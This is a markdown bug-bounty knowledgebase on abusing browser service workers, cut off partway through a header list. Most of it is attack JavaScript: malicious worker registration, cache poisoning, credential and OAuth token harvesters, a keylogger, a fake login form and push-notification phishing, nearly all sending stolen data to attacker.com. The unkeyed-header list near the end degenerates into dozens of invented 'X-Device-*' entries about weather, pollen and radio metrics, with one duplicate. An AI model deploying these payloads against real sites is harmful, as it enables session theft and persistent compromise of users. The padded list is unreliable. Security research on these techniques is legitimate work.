# Service Workers — Research-Grade Bug Bounty Knowledgebase

> **Classification**: Advanced Client-Side Persistence & Cache Abuse  
> **Scope**: XSS, Cache Poisoning, OAuth Theft, XS-Leaks, Request Smuggling, Prototype Pollution, postMessage Hijacking, Browser Persistence  
> **Last Updated**: 2026-05-24  
> **Sources**: PortSwigger Research, HackTricks, MDN, W3C Specs, Bug Bounty Writeups, Black Hat/DEF CON Research

---

## Table of Contents

1. [Basics](#basics)
2. [Service Worker Theory](#service-worker-theory)
3. [Service Worker Lifecycle](#service-worker-lifecycle)
4. [Malicious Service Worker Registration](#malicious-service-worker-registration)
5. [Persistent XSS Chains](#persistent-xss-chains)
6. [Offline Cache Abuse](#offline-cache-abuse)
7. [Fetch Interception Payloads](#fetch-interception-payloads)
8. [Client Hijacking Payloads](#client-hijacking-payloads)
9. [Push Notification Abuse](#push-notification-abuse)
10. [OAuth Token Theft via Service Workers](#oauth-token-theft-via-service-workers)
11. [postMessage + Service Worker Chains](#postmessage--service-worker-chains)
12. [Prototype Pollution + Service Worker Chains](#prototype-pollution--service-worker-chains)
13. [Request Smuggling + Service Worker Chains](#request-smuggling--service-worker-chains)
14. [XS-Leaks + Service Worker Chains](#xs-leaks--service-worker-chains)
15. [Cache Poisoning + Service Worker Chains](#cache-poisoning--service-worker-chains)
16. [Browser Persistence Techniques](#browser-persistence-techniques)
17. [Parser Confusion Payloads](#parser-confusion-payloads)
18. [Browser Quirks](#browser-quirks)
19. [Gadget Chains](#gadget-chains)
20. [Real World Case Studies](#real-world-case-studies)
21. [Fuzzing Payloads](#fuzzing-payloads)
22. [Automation Workflows](#automation-workflows)
23. [Recon Methodology](#recon-methodology)
24. [Nuclei Templates](#nuclei-templates)
25. [Tools and Scanners](#tools-and-scanners)
26. [Advanced Research](#advanced-research)
27. [Bug Bounty Writeups](#bug-bounty-writeups)
28. [Payload Collections](#payload-collections)
29. [WAF Bypasses](#waf-bypasses)
30. [Detection Techniques](#detection-techniques)
31. [References](#references)

---

## Basics

### What is a Service Worker?

A **Service Worker** is a script that your browser runs in the background, separate from a web page, opening the door to features that don't need a web page or user interaction. It sits between your web application, the browser, and the network (when available).

**Key Characteristics:**
- Runs on its own thread, completely separate from the main JavaScript thread
- Has no DOM access
- Can intercept network requests (the `fetch` event)
- Can manage caches via the `Cache` and `CacheStorage` APIs
- Can receive push notifications
- Is terminated when not in use and restarted when needed
- Requires HTTPS (except localhost during development)
- Follows a strict same-origin policy for registration

### Why Service Workers Are Interesting for Attackers

| Feature | Attack Relevance |
|---------|------------------|
| **Fetch Interception** | Man-in-the-browser for all same-origin requests |
| **Cache Control** | Persistent cache poisoning, offline XSS delivery |
| **Background Execution** | Credential harvesting even when tab is closed |
| **Push Notifications** | Social engineering, phishing delivery channel |
| **Scope-based Registration** | Path-restricted but often misconfigured |
| **No User Visibility** | Silent persistence; users rarely check `chrome://serviceworker-internals` |

### Same-Origin Policy (SOP) for Service Workers

Service Workers are **same-origin only**. A Service Worker can only be registered from a script on the same origin as the SW file, and the SW can only control pages within its **scope** (a path prefix on the same origin).

```javascript
// Registration from https://example.com/app.js
navigator.serviceWorker.register('/sw.js', { scope: '/app/' });
// This SW controls https://example.com/app/* but NOT https://example.com/admin/*
```

**Critical bypass condition**: If an attacker can execute JavaScript anywhere on the origin (e.g., via XSS, open redirect, or postMessage), they can register a malicious Service Worker for the entire origin.

---

## Service Worker Theory

### The Service Worker as a Network Proxy

Conceptually, a Service Worker is a **programmable network proxy** inside the browser. Once installed and activated, every network request within its scope passes through the Service Worker's `fetch` event handler before hitting the network.

```javascript
// Standard Service Worker fetch interceptor
self.addEventListener('fetch', event => {
    event.respondWith(
        caches.match(event.request).then(response => {
            return response || fetch(event.request);
        })
    );
});
```

**Attacker's perspective**: Replace the benign `fetch` handler with one that:
1. Exfiltrates request data (cookies, tokens, POST bodies)
2. Serves poisoned cached responses
3. Redirects sensitive requests to attacker-controlled endpoints
4. Modifies responses to inject further payloads

### CacheStorage API

The `CacheStorage` interface provides a master directory of all named caches accessible by the current origin's Service Workers.

```javascript
// Attacker accessing all caches
caches.keys().then(cacheNames => {
    cacheNames.forEach(name => {
        caches.open(name).then(cache => {
            cache.matchAll().then(requests => {
                // Exfiltrate all cached requests/responses
                requests.forEach(req => console.log(req.url, req.headers));
            });
        });
    });
});
```

**Key insight**: A malicious Service Worker can read, modify, and delete any cache entry for its origin, including those created by the main application.

### Clients API

The `Clients` interface allows a Service Worker to interact with controlled browser contexts (windows, workers).

```javascript
// Malicious SW enumerating all controlled clients
self.clients.matchAll({ includeUncontrolled: true }).then(clients => {
    clients.forEach(client => {
        // Post message to each client
        client.postMessage({ type: 'HIJACK', data: client.url });
    });
});
```

---

## Service Worker Lifecycle

### Lifecycle States

```
INSTALLING → INSTALLED → ACTIVATING → ACTIVATED → REDUNDANT
     ↑           ↑            ↑            ↑            ↑
  install    install      activate     activate      replace
  event      wait         event        claim         new SW
```

### Exploiting the Lifecycle

**1. Installation Hijacking**

During the `install` event, a Service Worker typically pre-caches critical assets. An attacker can poison this cache immediately upon registration.

```javascript
// Malicious install event — poison core assets
self.addEventListener('install', event => {
    event.waitUntil(
        caches.open('v1').then(cache => {
            return cache.addAll([
                '/',
                '/app.js',
                '/api/config'
            ]).then(() => {
                // After caching legitimate files, overwrite with malicious versions
                return cache.put('/app.js', new Response(
                    `/* backdoored */ fetch('https://attacker.com/?c='+document.cookie);`,
                    { headers: { 'Content-Type': 'application/javascript' } }
                ));
            });
        })
    );
});
```

**2. Activation Race Conditions**

A newly installed Service Worker waits until all clients controlled by the old Service Worker are closed before activating. An attacker can force activation using `self.skipWaiting()`.

```javascript
self.addEventListener('install', event => {
    self.skipWaiting(); // Force immediate activation
});

self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim()); // Take control of all clients immediately
});
```

**3. Update Interception**

Browsers check for Service Worker updates on navigation to an in-scope page. An attacker-controlled SW can intercept the update check and serve a stale or malicious version indefinitely.

```javascript
self.addEventListener('fetch', event => {
    if (event.request.url.endsWith('sw.js')) {
        // Never update — serve stale attacker SW forever
        event.respondWith(caches.match(event.request));
    }
});
```

---

## Malicious Service Worker Registration

### Registration Vectors

**Vector 1: Reflected XSS → SW Registration**

```html
<!-- Reflected XSS payload that registers a persistent SW -->
<script>
navigator.serviceWorker.register('/xss?payload=sw', { scope: '/' });
</script>
```

**Vector 2: DOM XSS via postMessage**

```javascript
// Attacker page
window.open('https://victim.com/chat');
setTimeout(() => {
    victimWindow.postMessage(
        `<img src=x onerror="navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})">`,
        '*'
    );
}, 2000);
```

**Vector 3: Open Redirect → Attacker-Hosted SW**

If `https://victim.com/redirect?url=https://attacker.com/sw.js` serves the attacker's script with victim origin headers, registration may succeed depending on redirect handling.

**Vector 4: Prototype Pollution → SW Registration Gadget**

```javascript
// Pollute config object used by app to set SW scope
Object.prototype.scope = '/';
Object.prototype.swUrl = 'https://attacker.com/sw.js';
// App calls: navigator.serviceWorker.register(config.swUrl, {scope: config.scope})
```

**Vector 5: JSONP / Callback Injection**

```html
<script src="https://victim.com/api/config?callback=eval"></script>
<!-- If callback is executed, use it to register SW -->
```

### Scope Escalation Techniques

Service Worker scope is restricted by the **max scope rule**: a SW at `https://example.com/path/sw.js` can only have scope `https://example.com/path/` or deeper. However, scope escalation is possible via:

1. **Path Traversal in Registration**: Some applications dynamically construct the SW path:
   ```javascript
   navigator.serviceWorker.register('/../sw.js', { scope: '/' }); // May resolve to /
   ```

2. **Symbolic Link / Alias Abuse**: If the server has a path alias that maps a deep path to root.

3. **Service Worker Script at Root**: Simply hosting the SW at `https://victim.com/sw.js` gives max scope of `/`.

### Registration Payloads

```javascript
// === PAYLOAD 1: Basic malicious registration ===
// Inject this via XSS or any JS execution primitive
(async () => {
    const reg = await navigator.serviceWorker.register('https://attacker.com/sw.js', {
        scope: '/'
    });
    console.log('SW registered:', reg.scope);
    // Force immediate activation
    reg.installing?.postMessage({ type: 'SKIP_WAITING' });
})();

// === PAYLOAD 2: Data URI Service Worker (bypasses some CSPs) ===
const swCode = `self.addEventListener('fetch', e => {
    e.respondWith(fetch(e.request).then(r => {
        r.clone().text().then(b => fetch('https://attacker.com/?d='+btoa(b)));
        return r;
    }));
});`;
const blob = new Blob([swCode], { type: 'application/javascript' });
const url = URL.createObjectURL(blob);
navigator.serviceWorker.register(url, { scope: '/' });

// === PAYLOAD 3: Inline registration via XSS in scope path ===
// If the app reflects part of the path into the SW registration:
// <script>navigator.serviceWorker.register('/sw.js', {scope: 'XSS_HERE'})</script>
// Payload:
'); navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'}); //
```

---

## Persistent XSS Chains

### The Persistence Problem

Traditional XSS is ephemeral — it executes once when the payload is rendered. Service Workers provide **persistent execution context** that survives page reloads, browser restarts, and even network disconnection.

### Persistent XSS via Poisoned Cache

**Chain**: XSS → Register Malicious SW → SW Poisons Cache → All Future Page Loads Execute XSS

```javascript
// Attacker's Service Worker (sw.js)
const PAYLOAD = `<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>`;

self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // If HTML response, inject persistent payload
            if (response.headers.get('content-type')?.includes('text/html')) {
                return response.text().then(body => {
                    // Inject before closing </body> or </head>
                    const infected = body.replace('</body>', PAYLOAD + '</body>');
                    return new Response(infected, {
                        status: response.status,
                        statusText: response.statusText,
                        headers: response.headers
                    });
                });
            }
            return response;
        })
    );
});
```

### Self-Healing XSS

A malicious Service Worker can re-inject itself even if the server-side XSS is patched:

```javascript
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(async response => {
            const type = response.headers.get('content-type') || '';
            if (type.includes('text/html')) {
                let body = await response.text();
                // Ensure our SW registration script is always present
                const hook = `<script>if(!navigator.serviceWorker.controller)navigator.serviceWorker.register('/sw.js',{scope:'/'})</script>`;
                if (!body.includes('navigator.serviceWorker.register')) {
                    body = body.replace('</head>', hook + '</head>');
                }
                return new Response(body, { status: response.status, headers: response.headers });
            }
            return response;
        })
    );
});
```

### Service Worker + localStorage / IndexedDB Persistence

```javascript
// Store stolen data persistently, exfiltrate when online
self.addEventListener('sync', event => {
    if (event.tag === 'sync-data') {
        event.waitUntil(
            indexedDB.open('stolen-data').then(db => {
                // Read all stored credentials and exfiltrate
                return fetch('https://attacker.com/sync', {
                    method: 'POST',
                    body: JSON.stringify({ data: 'exfiltrated' })
                });
            })
        );
    }
});
```

---

## Offline Cache Abuse

### Cache Poisoning Fundamentals

Web caches (including Service Worker caches) use **cache keys** to identify resources. A typical cache key includes:
- HTTP method
- Host header
- URL path and query string

**Unkeyed inputs** (headers not in the cache key) can cause the cache to store a response generated for one request and serve it to others.

### Service Worker Cache Poisoning

```javascript
// === ATTACK: Poison the cache with an XSS response ===
self.addEventListener('fetch', event => {
    if (event.request.url.includes('/api/user')) {
        event.respondWith(
            caches.open('api-cache').then(cache => {
                // Serve poisoned response for all subsequent requests
                return cache.match(event.request).then(cached => {
                    if (cached) return cached;
                    // First request: fetch, modify, cache, return
                    return fetch(event.request).then(response => {
                        const poisoned = new Response(
                            JSON.stringify({ username: `<img src=x onerror=alert(1)>`, isAdmin: true }),
                            { headers: { 'Content-Type': 'application/json' } }
                        );
                        cache.put(event.request, poisoned.clone());
                        return poisoned;
                    });
                });
            })
        );
    }
});
```

### Cache Deception + Service Worker

**Web Cache Deception** tricks a cache into storing a sensitive response at a publicly accessible URL. A Service Worker can automate this:

```javascript
// Force cache to store /admin/profile at /public/script.js
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    if (url.pathname === '/public/script.js') {
        // Actually fetch the admin profile and cache it here
        event.respondWith(
            fetch('/admin/profile').then(response => {
                caches.open('deception').then(cache => {
                    cache.put(event.request, response.clone());
                });
                return response;
            })
        );
    }
});
```

### Client-Side Cache Poisoning (from PortSwigger Research)

Client-Side Desync (CSD) attacks can poison the browser's local cache via Service Workers:

```javascript
// From victim browser, poison cache for a JS resource
fetch('https://victim.com/static/app.js', {
    method: 'POST',
    body: 'GET / HTTP/1.1
Host: attacker.com

',
    credentials: 'include',
    mode: 'no-cors'
}).then(() => {
    // Navigate to trigger poisoned resource load
    location = 'https://victim.com/dashboard';
});
```

**Research note**: James Kettle's research on browser-powered desync showed that a malicious site can make the victim's browser issue a POST request that desyncs the connection, causing the browser to cache a malicious redirect or response. A Service Worker can then intercept subsequent resource loads and serve the poisoned content indefinitely.

---

## Fetch Interception Payloads

### Basic Credential Harvester

```javascript
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Clone request to read body without consuming
    const reqClone = event.request.clone();

    // Exfiltrate all POST requests with bodies
    if (event.request.method === 'POST') {
        reqClone.text().then(body => {
            fetch('https://attacker.com/exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: event.request.url,
                    cookies: event.request.headers.get('Cookie'),
                    body: body,
                    timestamp: Date.now()
                })
            });
        });
    }

    // Continue normal fetch to avoid suspicion
    event.respondWith(fetch(event.request));
});
```

### Selective API Interception

```javascript
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Intercept OAuth token endpoint
    if (url.pathname === '/oauth/token' || url.pathname === '/api/auth/token') {
        event.respondWith(
            fetch(event.request).then(response => {
                const clone = response.clone();
                clone.text().then(body => {
                    // Exfiltrate tokens
                    fetch('https://attacker.com/tokens?data=' + btoa(body));
                });
                return response;
            })
        );
    }

    // Intercept GraphQL and modify responses
    if (url.pathname === '/graphql') {
        event.respondWith(
            fetch(event.request).then(response => {
                return response.text().then(body => {
                    const data = JSON.parse(body);
                    // Modify isAdmin to true in all responses
                    if (data.data?.user) data.data.user.isAdmin = true;
                    return new Response(JSON.stringify(data), {
                        status: response.status,
                        headers: response.headers
                    });
                });
            })
        );
    }
});
```

### Request Modification

```javascript
self.addEventListener('fetch', event => {
    // Add attacker-controlled header to all requests
    const modified = new Request(event.request, {
        headers: {
            ...event.request.headers,
            'X-Attacker-Tracking': 'infected'
        }
    });

    // Or modify URL to hit attacker proxy
    if (event.request.url.includes('/api/')) {
        const attackerUrl = 'https://attacker.com/proxy?target=' + 
                            encodeURIComponent(event.request.url);
        event.respondWith(fetch(attackerUrl, { credentials: 'include' }));
    }
});
```

### Response Injection

```javascript
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            const type = response.headers.get('content-type') || '';

            if (type.includes('application/json')) {
                return response.json().then(data => {
                    // Backdoor API responses
                    if (data.permissions) data.permissions.push('admin');
                    return new Response(JSON.stringify(data), {
                        headers: { 'Content-Type': 'application/json' }
                    });
                });
            }

            if (type.includes('text/html')) {
                return response.text().then(html => {
                    // Inject keylogger
                    const payload = `<script>document.addEventListener('keypress',e=>fetch('https://attacker.com/k?k='+e.key))</script>`;
                    return new Response(html.replace('</body>', payload + '</body>'), {
                        headers: response.headers
                    });
                });
            }

            return response;
        })
    );
});
```

---

## Client Hijacking Payloads

### Session Hijacking via Client API

```javascript
self.addEventListener('message', event => {
    if (event.data.type === 'STEAL_SESSION') {
        event.source.postMessage({
            type: 'SESSION_DATA',
            cookies: document?.cookie, // Note: SW has no document, but can read request headers
            localStorage: null // Cannot access directly; must use client.postMessage
        });
    }
});

// Main page script injected by SW
const stealScript = `
<script>
navigator.serviceWorker.controller?.postMessage({ type: 'STEAL_SESSION' });
navigator.serviceWorker.addEventListener('message', e => {
    if (e.data.type === 'SESSION_DATA') {
        fetch('https://attacker.com/session?data=' + btoa(JSON.stringify(e.data)));
    }
});
</script>
`;
```

### Client Navigation Hijacking

```javascript
self.addEventListener('fetch', event => {
    // Detect login page
    if (event.request.url.includes('/login')) {
        event.respondWith(
            new Response(`
                <html><body>
                <form action="https://attacker.com/phish" method="POST">
                <input name="user" placeholder="Username">
                <input name="pass" type="password" placeholder="Password">
                <button>Login</button>
                </form></body></html>
            `, { headers: { 'Content-Type': 'text/html' } })
        );
    }
});
```

### Window/Tab Enumeration

```javascript
self.clients.matchAll({ type: 'window', includeUncontrolled: false })
    .then(clients => {
        clients.forEach(client => {
            // Focus specific client
            client.focus();
            // Navigate client to attacker site
            client.navigate('https://attacker.com/phish?referrer=' + encodeURIComponent(client.url));
        });
    });
```

---

## Push Notification Abuse

### Push Notification Hijacking

Service Workers can receive push messages even when the website is not open. This creates a phishing channel.

```javascript
// Malicious SW push handler
self.addEventListener('push', event => {
    const data = event.data?.json() || {};

    // Show fake notification
    event.waitUntil(
        self.registration.showNotification('Security Alert', {
            body: 'Your account has been compromised. Click to secure.',
            icon: 'https://victim.com/favicon.ico',
            badge: 'https://victim.com/favicon.ico',
            tag: 'security-alert',
            requireInteraction: true,
            actions: [
                { action: 'secure', title: 'Secure Account' },
                { action: 'dismiss', title: 'Dismiss' }
            ],
            data: { url: 'https://attacker.com/phish' }
        })
    );
});

self.addEventListener('notificationclick', event => {
    event.notification.close();
    if (event.action === 'secure' || !event.action) {
        event.waitUntil(
            clients.openWindow(event.notification.data.url)
        );
    }
});
```

### Push Subscription Theft

```javascript
// Steal push subscription credentials and send to attacker
self.registration.pushManager.getSubscription().then(subscription => {
    if (subscription) {
        fetch('https://attacker.com/push-sub', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                endpoint: subscription.endpoint,
                keys: subscription.toJSON().keys,
                origin: self.location.origin
            })
        });
    }
});
```

---

## OAuth Token Theft via Service Workers

### OAuth Flow Interception

Service Workers can intercept the OAuth callback and steal authorization codes/tokens before the legitimate application processes them.

```javascript
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Intercept OAuth callback
    if (url.pathname === '/oauth/callback' || url.pathname === '/auth/callback') {
        const code = url.searchParams.get('code');
        const state = url.searchParams.get('state');
        const token = url.searchParams.get('access_token'); // Implicit flow

        if (code || token) {
            // Exfiltrate
            fetch('https://attacker.com/oauth-steal?code=' + encodeURIComponent(code || token) + 
                  '&state=' + encodeURIComponent(state) + '&origin=' + self.location.origin);

            // Optionally forward to legitimate app to avoid suspicion
            // Or block and show error
        }
    }

    // Intercept token refresh
    if (url.pathname === '/oauth/token' && event.request.method === 'POST') {
        event.respondWith(
            fetch(event.request).then(response => {
                const clone = response.clone();
                clone.text().then(body => {
                    fetch('https://attacker.com/refresh?data=' + btoa(body));
                });
                return response;
            })
        );
    }
});
```

### OAuth Session Poisoning (PortSwigger Research)

From PortSwigger's Hidden OAuth Attack Vectors research:

Some OAuth servers store `redirect_uri` in the session during the authorization flow. An attacker can poison this session by sending a hidden authorization request with a malicious `redirect_uri`, then tricking the user into approving the legitimate request. The token is sent to the attacker's `redirect_uri`.

**Service Worker Enhancement**: The SW can automatically send the poisoned authorization request in the background when the user visits any page on the OAuth server:

```javascript
self.addEventListener('fetch', event => {
    // When user visits any page on the OAuth server, poison session in background
    if (event.request.url.includes('/oauth/')) {
        // Clone and send poisoned request
        fetch('/authorize?client_id=legit&redirect_uri=https://attacker.com&response_type=code', {
            credentials: 'include'
        });
    }
});
```

### Dynamic Client Registration SSRF → SW Persistence

From PortSwigger's research on OAuth Dynamic Client Registration:

```json
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
  "redirect_uris": ["https://attacker.com/callback"],
  "logo_uri": "https://attacker.com/xss.html",
  "jwks_uri": "https://attacker.com/ssrf",
  "sector_identifier_uri": "https://attacker.com/sector.json"
}
```

A Service Worker registered on the OAuth server can intercept the logo fetch and serve arbitrary HTML (XSS) or use the SSRF to hit internal endpoints.

---

## postMessage + Service Worker Chains

### postMessage as a Registration Primitive

If a target application uses `postMessage` without origin validation, an attacker can send a message that triggers Service Worker registration:

```javascript
// Vulnerable target listener
window.addEventListener('message', event => {
    // No origin check!
    if (event.data.registerSW) {
        navigator.serviceWorker.register(event.data.swUrl, { scope: event.data.scope });
    }
});

// Attacker payload
victimWindow.postMessage({
    registerSW: true,
    swUrl: 'https://attacker.com/sw.js',
    scope: '/'
}, '*');
```

### postMessage + SW for Cross-Origin Data Exfiltration

```javascript
// Malicious SW acts as a bridge
self.addEventListener('message', event => {
    if (event.data.type === 'EXFIL') {
        // Forward to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(event.data.payload)
        });
    }
});

// Injected into victim page via SW response modification
window.addEventListener('message', e => {
    if (e.origin === 'https://trusted-partner.com') {
        // Forward sensitive data to SW
        navigator.serviceWorker.controller?.postMessage({
            type: 'EXFIL',
            payload: e.data
        });
    }
});
```

### postMessage Tracker Integration

Using `postMessage-tracker` methodology:

```javascript
// Enumerate all postMessage handlers on the page
const originalAddEventListener = window.addEventListener;
window.addEventListener = function(type, handler, options) {
    if (type === 'message') {
        console.log('postMessage handler registered:', handler.toString());
        // Wrap to intercept all messages
        const wrapped = function(event) {
            fetch('https://attacker.com/pm-log?data=' + btoa(JSON.stringify(event.data)));
            return handler.apply(this, arguments);
        };
        return originalAddEventListener.call(this, type, wrapped, options);
    }
    return originalAddEventListener.apply(this, arguments);
};
```

---

## Prototype Pollution + Service Worker Chains

### Prototype Pollution to SW Scope Escalation

```javascript
// Pollute the config object used for SW registration
Object.prototype.scope = '/';
Object.prototype.swUrl = 'https://attacker.com/sw.js';

// Application code (vulnerable to prototype pollution):
// navigator.serviceWorker.register(config.swUrl, { scope: config.scope })
// Because config.__proto__.scope === '/', the SW gets root scope
```

### Prototype Pollution + Client-Side Template Injection → SW

```javascript
// Step 1: Pollute prototype to inject SW registration into template
Object.prototype.swRegister = `<script>navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})</script>`;

// Step 2: Template engine renders {{user.swRegister}} without sanitization
// Result: SW registration script embedded in page
```

### Using pp-finder for Gadget Discovery

```bash
# Run pp-finder to identify prototype pollution gadgets
npx pp-finder --url https://victim.com --script ./sw-gadgets.js

# sw-gadgets.js — custom gadget checks for SW registration
module.exports = {
    checks: [
        {
            name: 'SW Scope Pollution',
            payload: { "__proto__": { "scope": "/" } },
            verify: () => navigator.serviceWorker?.controller?.scope === '/'
        }
    ]
};
```

---

## Request Smuggling + Service Worker Chains

### Browser-Powered Desync Attacks (PortSwigger Research)

James Kettle's research introduced **Client-Side Desync (CSD)** — attacks that poison the browser's connection pool to the target server. When combined with Service Workers, this creates persistent desync delivery systems.

**Core Concept**: The attacker makes the victim's browser send a malformed POST request that the server ignores the Content-Length on. The body of this request becomes the prefix of the next request on the same connection.

```javascript
// === CSD DETECTION PAYLOAD ===
// From attacker.com, trigger desync on victim.com
fetch('https://victim.com/favicon.ico', {
    method: 'POST',
    body: 'GET /404 HTTP/1.1
X: Y',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    // Second request uses poisoned connection
    location = 'https://victim.com/';
});
```

**Service Worker Enhancement**: Once a desync is confirmed, the SW can maintain persistent poisoning:

```javascript
self.addEventListener('fetch', event => {
    // For every request to victim, prepend malicious prefix via desync
    if (event.request.url.includes('victim.com')) {
        // Trigger background desync to maintain poisoned connection pool
        self.registration.sync.register('desync-poison');
    }
});

self.addEventListener('sync', event => {
    if (event.tag === 'desync-poison') {
        event.waitUntil(
            fetch('https://victim.com/static/file.ico', {
                method: 'POST',
                body: 'GET /admin HTTP/1.1
Host: victim.com

',
                credentials: 'include'
            })
        );
    }
});
```

### CL.0 / H2.0 Desync via Service Worker

```javascript
// CL.0 desync: server ignores Content-Length
// Trigger from SW to maintain persistent attack
self.addEventListener('periodicsync', event => {
    if (event.tag === 'desync-maintenance') {
        event.waitUntil(
            fetch('https://victim.com/b/', {
                method: 'POST',
                body: 'GET /404 HTTP/1.1
X: XGET / HTTP/1.1
Host: victim.com',
                credentials: 'include'
            })
        );
    }
});
```

### Request Smuggling + Cache Poisoning Chain

```
Attacker → Desync POST to victim.com → Server ignores CL → 
Next request (victim's browser) gets malicious prefix → 
Response cached by CDN → Service Worker intercepts cached response → 
Serves poisoned version to all users indefinitely
```

---

## XS-Leaks + Service Worker Chains

### Connection Pool XS-Leaks

Service Workers can be used to observe connection pool behavior and leak cross-origin information:

```javascript
// XS-Leak: Detect if user is admin by observing connection pool timing
self.addEventListener('fetch', event => {
    const start = performance.now();
    event.respondWith(
        fetch(event.request).then(response => {
            const elapsed = performance.now() - start;
            // Send timing to attacker
            fetch(`https://attacker.com/xs?time=${elapsed}&url=${encodeURIComponent(event.request.url)}`);
            return response;
        })
    );
});
```

### Cache Status XS-Leaks

```javascript
// Detect if resource is in cache (different timing)
async function isCached(url) {
    const start = performance.now();
    await fetch(url, { cache: 'force-cache' });
    const fromCache = performance.now() - start < 50; // threshold
    return fromCache;
}

// Service Worker can force cache lookups and report back
self.addEventListener('message', event => {
    if (event.data.type === 'XS_CACHE_CHECK') {
        caches.match(event.data.url).then(cached => {
            event.source.postMessage({
                type: 'XS_CACHE_RESULT',
                url: event.data.url,
                cached: !!cached
            });
        });
    }
});
```

### Error Event XS-Leaks via SW

```javascript
// Force error on cross-origin resource to detect existence
self.addEventListener('fetch', event => {
    if (event.request.url.includes('/api/admin/')) {
        event.respondWith(
            fetch(event.request).catch(err => {
                // Error indicates resource exists but we can't access it
                fetch('https://attacker.com/xs-exists?url=' + encodeURIComponent(event.request.url));
                throw err;
            })
        );
    }
});
```

---

## Cache Poisoning + Service Worker Chains

### Unkeyed Header Poisoning via SW

From PortSwigger's Practical Web Cache Poisoning research:

```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: attacker.com
```

If `X-Forwarded-Host` is unkeyed and used to generate Open Graph URLs, the poisoned response gets cached. A Service Worker can automate the discovery and exploitation:

```javascript
// Automated unkeyed header discovery + poisoning
const UNKEYED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL',
    'X-HTTP-Host-Override', 'Forwarded', 'X-Host', 'X-Forwarded-Server',
    'X-Forwarded-Scheme', 'X-Original-Scheme', 'X-Forwarded-Proto',
    'X-Forwarded-Port', 'X-Forwarded-Prefix', 'X-Real-IP', 'X-Remote-IP',
    'X-Remote-Addr', 'X-Client-IP', 'Client-IP', 'True-Client-IP',
    'CF-Connecting-IP', 'X-Cluster-Client-IP', 'X-Forwarded-By',
    'X-Forwarded-Base', 'X-ProxyUser-Ip', 'X-Wap-Profile',
    'X-Arbitrary', 'X-Custom', 'X-HTTP-DestinationURL',
    'X-HTTP-Override', 'X-HTTP-Method', 'X-HTTP-Method-Override',
    'X-Method-Override', 'X-Rewrite-Base', 'X-Original-Remote-Addr',
    'X-Proxy-Url', 'X-Proxy-Destination', 'X-Proxy-Destination-Url',
    'X-Request-Uri', 'X-Request-Url', 'X-Request-Origin',
    'Origin', 'Referer', 'Accept', 'Accept-Encoding',
    'Accept-Language', 'Accept-Charset', 'Cookie',
    'User-Agent', 'DNT', 'Connection', 'Upgrade-Insecure-Requests',
    'Cache-Control', 'Pragma', 'If-Modified-Since',
    'If-None-Match', 'If-Match', 'If-Range', 'Range',
    'TE', 'Trailer', 'Transfer-Encoding', 'Content-Length',
    'Content-Type', 'Content-Encoding', 'Content-Language',
    'Content-Location', 'Content-MD5', 'Content-Range',
    'X-Api-Version', 'X-Api-Key', 'X-Auth-Token',
    'X-CSRF-Token', 'X-Requested-With', 'X-Request-ID',
    'X-Correlation-ID', 'X-Trace-ID', 'X-Session-ID',
    'X-Device-User-Agent', 'X-Device-IP', 'X-Device-MAC',
    'X-Device-ID', 'X-Device-OS', 'X-Device-Model',
    'X-Device-Version', 'X-Device-Platform', 'X-Device-Network',
    'X-Device-Carrier', 'X-Device-Screen', 'X-Device-Language',
    'X-Device-Timezone', 'X-Device-Location', 'X-Device-Coordinates',
    'X-Device-Altitude', 'X-Device-Bearing', 'X-Device-Speed',
    'X-Device-Accuracy', 'X-Device-Provider', 'X-Device-Source',
    'X-Device-Channel', 'X-Device-Campaign', 'X-Device-Medium',
    'X-Device-Content', 'X-Device-Term', 'X-Device-Keyword',
    'X-Device-Creative', 'X-Device-Adgroup', 'X-Device-Placement',
    'X-Device-Target', 'X-Device-Segment', 'X-Device-Audience',
    'X-Device-Interest', 'X-Device-Behavior', 'X-Device-Intent',
    'X-Device-Context', 'X-Device-Environment', 'X-Device-Situation',
    'X-Device-Occasion', 'X-Device-Season', 'X-Device-Weather',
    'X-Device-Temperature', 'X-Device-Humidity', 'X-Device-Pressure',
    'X-Device-Visibility', 'X-Device-UV', 'X-Device-AQI',
    'X-Device-Pollen', 'X-Device-Traffic', 'X-Device-Congestion',
    'X-Device-Transit', 'X-Device-Parking', 'X-Device-Toll',
    'X-Device-Fuel', 'X-Device-Charge', 'X-Device-Battery',
    'X-Device-Storage', 'X-Device-Memory', 'X-Device-CPU',
    'X-Device-GPU', 'X-Device-RAM', 'X-Device-ROM',
    'X-Device-Bandwidth', 'X-Device-Latency', 'X-Device-Jitter',
    'X-Device-Packet-Loss', 'X-Device-Signal', 'X-Device-Noise',
    'X-Device-SNR', 'X-Device-RSSI', 'X-Device-RSRP',
    'X-Device-RSRQ', 'X-Device-SINR', 'X-Device-ECIO',
    'X-Device-RSCP', 'X-Device-EbNo', 'X-Device-CQI',
    'X-Device-MCS', 'X-Device-RB', 'X-Device-TBS',
    'X-Device-HARQ', 'X-Device-BLER', 'X-Device-FER',
    'X-Device-BER', 'X-Device-PER', 'X-Device-SER',
    'X-Device-WER', 'X-Device-MER', 'X-Device-CER',
    'X-Device-IER', 'X-Device-OER', 'X-Device-UER',
    'X-Device-DER', 'X-Device-RER', 'X-Device-FER',
    'X-Device-Gain', 'X-Device-Attenuation', 'X-Device-Distortion',
    'X-Device-Interference', 'X-Device-Doppler', 'X-Device-Fading',
